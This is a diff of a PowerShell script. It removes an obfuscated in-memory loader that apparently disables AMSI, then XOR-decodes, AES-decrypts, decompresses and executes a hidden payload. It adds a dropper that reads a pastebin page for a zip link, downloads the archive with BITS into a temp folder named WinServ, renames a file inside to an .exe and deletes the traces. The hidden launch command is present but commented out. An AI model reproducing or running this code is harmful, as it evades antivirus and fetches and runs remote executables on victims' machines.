@@ -1,61 +1,46 @@
-([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("Zm9yZWFjaCgkaSBpbiBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlcygpKXtpZigkaS5OYW1lIC1saWtlICIqc2lVIisiKiIrImlscyIpeyR1dGlsRnVuY3Rpb25zPSRpLkdldEZpZWxkcygnTm9uUHVibGljLFN0YXRpYycpfX07CiRtb3JlY29kZT0iYXNkYWdnd3J3YWdyd3dlZmVhZ3dnIgpmb3JlYWNoKCRmdW5jIGluICR1dGlsRnVuY3Rpb25zKXtpZigkZnVuYy5OYW1lIC1saWtlICIqQ29udGV4dCIpeyRhZGRyPSRmdW5jLkdldFZhbHVlKCRudWxsKX19OwokZGVhZGMwZGU9NDUxMjM0MTIzNTEyMzE1MjM1NjMyMzQ1CltJbnRwdHJdJHBvaW50ZXI9JGFkZHI7CiRkZWFkYjMzZj0ic3RyaW5nMTIzNDIzNDUzMTIzNSIKW0ludDMyW11dJG51bGxCeXRlPUAoMCk7CltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJG51bGxCeXRlLDAsJHBvaW50ZXIsMSk7")))|iex
-$93gumngq67h6 = [text.encoDiNg]::"uT`F`8".GetBYtES("sug2511u4f")
-$t9t4y566hkup = [tEXt.enCODINg]::"uT`F`8".gEtSTrinG([ConverT]::fRoMBasE64strIng("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"))
-$n17n6ghtggi6h = [TeXT.EnCodiNg]::"uT`F`8".GETBYTES($t9t4y566hkup)
-$o5jnfk2ojx00 = $(for ($xh8uq9fg3v71r9r = 0; $xh8uq9fg3v71r9r -lt $n17n6ghtggi6h.lengTH; ) {
-    for ($q1fozpo3h6 = 0; $q1fozpo3h6 -lt $93gumngq67h6.LengTh; $q1fozpo3h6++) {
-        $n17n6ghtggi6h[$xh8uq9fg3v71r9r] -bxor $93gumngq67h6[$q1fozpo3h6]
-        $xh8uq9fg3v71r9r++
-        if ($xh8uq9fg3v71r9r -ge $n17n6ghtggi6h.lENGTh) {
-            $q1fozpo3h6 = $93gumngq67h6.lENgth
-        }
+function Get-RawPastebinContent {
+    param(
+        [string]$PastebinRawUrl
+    )
+
+    $content = Invoke-RestMethod -Uri $PastebinRawUrl
+    return $content
+}
+
+function Get-ZipUrlFromText {
+    param(
+        [string]$Text
+    )
+
+    $regex = '(?im)(http.*?\.zip)'
+    $matches = [regex]::Matches($Text, $regex)
+    foreach ($match in $matches) {
+        return $match.Value
     }
-})
-$o5jnfk2ojx00 = [texT.enCoDiNg]::"uT`F8".GEtsTring($o5jnfk2ojx00)
-$kw66g86q81qm = "$o5jnfk2ojx00"
-$2g6o3v71p344j14 = $kw66g86q81qm.ToCharArray()
-[ArRay]::ReVErse($2g6o3v71p344j14)
-$nrtx8ioft6ngyuur = -JOIn($2g6o3v71p344j14)
-$pohpu437w3 = [CONvERt]::FrOMbASe64sTrinG("$nrtx8ioft6ngyuur")
-$31f7ns4wkwzyv1 = [CoNVERT]::FrOmbase64stRInG("MV5aByQLZYPwSWa24f+J8jTFxPkwmFDkttO9RnJekWw=")
-$sx3o8u8vstpm = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"
-$miysyg8y5i0g = $sx3o8u8vstpm.ToCharArray()
-[ARRAy]::ReVerSE($miysyg8y5i0g)
-$sh13764zg9 = -join($miysyg8y5i0g)
-$9nxozyhijpv = [teXt.ENcOdiNG]::"uT`F8".gEtsTRINg([CONVeRT]::FRomBasE64stRiNg($sh13764zg9))
-$4jtri8ij8km69ff = New-Object "$9nxozyhijpv"
-$v3oqrqzf9t = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
-$7w3fmx82mmt7 = $v3oqrqzf9t.ToCharArray()
-[ARRAY]::revERsE($7w3fmx82mmt7)
-$3w3tzupoyskku0 = -join($7w3fmx82mmt7)
-$g52s9w6rsj = [texT.encODInG]::"uT`F8".gETstrINg([ConveRT]::fRoMBase64strINg($3w3tzupoyskku0))
-$7kqukiyi8js6spiq = & ([scriptblock]::Create($g52s9w6rsj))
-$4jtri8ij8km69ff.MoDe = $7kqukiyi8js6spiq
-$6yk8urhv8f8y = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"
-$i8tuy1y1wh6mxg7 = $6yk8urhv8f8y.ToCharArray()
-[array]::Reverse($i8tuy1y1wh6mxg7)
-$8pjf2wrmyst = -jOin($i8tuy1y1wh6mxg7)
-$1m026yusihxfgi5 = [TExt.encoDING]::"uT`F8".geTsTrInG([coNVErt]::FRoMbAsE64STrinG($8pjf2wrmyst))
-$ynk2wkwi4p = & ([scriptblock]::Create($1m026yusihxfgi5))
-$4jtri8ij8km69ff.Padding = $ynk2wkwi4p
-$4jtri8ij8km69ff.bLOcksIzE = ((10+50-20*2)+(4)-20/20+105)
-$4jtri8ij8km69ff.kEYsizE = 128
-$4jtri8ij8km69ff.Key = $31f7ns4wkwzyv1
-$4jtri8ij8km69ff.IV = $pohpu437w3[0..(4+5+(20-5-5-2-1-1))]
-$gkktj7j4w02shfh = [teXT.EncOdINg]::UTf8.GetsTRiNg([CONVerT]::FrOMBASe64StRING("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))
-$h3jzk0n8kgg = New-ObJecT $gkktj7j4w02shfh(,$4jtri8ij8km69ff.cReatEDeCRYpToR().TranSFOrmfiNALBloCk($pohpu437w3,16-5+5-5+1+1+1+2,$pohpu437w3.Length-16+16-16))
-$wu4fgxz1kv53nm3m = New-Object $gkktj7j4w02shfh
-$u4opmsk30gx1zwgu = [NEt.WeButiliTy]::hTmLdEcOdE("&#x44;&#x65;&#x63;&#x6f;&#x6d;&#x70;&#x72;&#x65;&#x73;&#x73;")
-$27thk5v8rvtq9js = & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))
-$421qsq90owh2o = [tExT.ENcodInG]::UTf8.GeTstrINg([coNvERT]::FRoMBAsE64StRING("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))
-$3vzphrmtywyrqvg4 = New-Object $421qsq90owh2o $h3jzk0n8kgg, ($27thk5v8rvtq9js::$u4opmsk30gx1zwgu)
-$3vzphrmtywyrqvg4.CopyTo($wu4fgxz1kv53nm3m)
-$3vzphrmtywyrqvg4.Close()
-$4jtri8ij8km69ff.Dispose()
-$h3jzk0n8kgg.Close()
-$1wr279py7r = & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))
-$h8869xg34nkki = ([rEgEX]::uNescape("\u0055\u0054\u0046\u0038"))
-$77n29q5xnghv = ([TeXT.ENCOdinG]::uNiCoDE.gEtSTrInG([cOnveRT]::FROmBAse64stRInG("VABvAEEAcgByAGEAeQA=")))
-$myx6fr5sq60rssm = ([TeXT.ENCOdinG]::unICodE.gEtSTRIng([cOnvert]::FromBAse64stRing("RwBlAHQAUwB0AHIAaQBuAGcA")))
-$u9786q1wk6u45ptk = $1wr279py7r::$h8869xg34nkki.$myx6fr5sq60rssm($wu4fgxz1kv53nm3m.$77n29q5xnghv())
-i`Ex($u9786q1wk6u45ptk)
+}
+
+$pastebinRawUrl = "https://pastebin.com/raw/S9B5GjSJ"
+$pastebinContent = Get-RawPastebinContent -PastebinRawUrl $pastebinRawUrl
+
+$zipUrl = Get-ZipUrlFromText -Text $pastebinContent
+
+$tempPath = [System.IO.Path]::GetTempPath()
+$appFolder = Join-Path -Path $tempPath -ChildPath "WinServ"
+
+$zipPath = Join-Path -Path $appFolder -ChildPath "Service.zip"
+$extractedPath = Join-Path -Path $appFolder -ChildPath "Win"
+
+Start-BitsTransfer -Source $zipUrl -Destination $zipPath
+
+New-Item -Path $appFolder -ItemType Directory -Force
+
+Expand-Archive -Path $zipPath -DestinationPath $extractedPath -Force
+Rename-Item -Path "$extractedPath\ud8wua82" -NewName "ud8wua82.exe"
+$exePath = Join-Path -Path $extractedPath -ChildPath "ud8wua82.exe"
+
+#Start-Process -FilePath $exePath -ArgumentList "-NoProfile" -ExecutionPolicy Bypass -WindowStyle Hidden
+Remove-Item -Path $zipPath
+
+Start-Sleep -Seconds 300
+
+Remove-Item -Path $extractedPath -Recurse
